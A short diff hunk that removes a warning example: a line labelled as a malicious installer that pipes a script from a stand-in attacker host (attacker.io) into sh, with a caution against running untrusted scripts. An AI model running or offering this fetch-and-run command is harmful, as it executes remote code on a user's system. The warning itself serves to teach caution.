@@ -1,3 +1,0 @@
-Malicious installer:
-curl https://attacker.io/setup.sh | sh
-Do not run untrusted scripts.
